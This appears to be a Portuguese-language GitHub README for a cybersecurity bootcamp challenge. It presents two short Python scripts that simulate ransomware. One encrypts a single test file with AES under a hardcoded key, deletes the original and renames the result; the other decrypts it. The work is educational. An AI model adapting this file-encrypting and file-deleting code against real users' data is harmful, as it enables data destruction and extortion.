# Desafio-ransomware-simulation
Concluí um desafio técnico no bootcamp de Cibersegurança 2 da DIO, onde simulei o comportamento de um ransomware, incluindo a criptografia e descriptografia de arquivos utilizando Python e AES. O objetivo foi entender como funcionam os ataques de ransomware, além de praticar habilidades de criptografia.

import os
import pyaes

file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

os.remove(file_name)

key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

crypto_data = aes.encrypt(file_data)

new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}', 'wb')
new_file.write(crypto_data)
new_file.close()
import os
import pyaes

file_name = "teste.txt.ransomwaretroll"
file = open(file_name, "rb")
file_data = file.read()
file.close()

key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)
decrypt_data = aes.decrypt(file_data)

os.remove(file_name)

new_file = "teste.txt"
new_file = open(f'{new_file}', "wb")
new_file.write(decrypt_data)
new_file.close()
![image](https://github.com/user-attachments/assets/bc3acf1f-0c9b-440b-b3b7-207c00ff6bff)
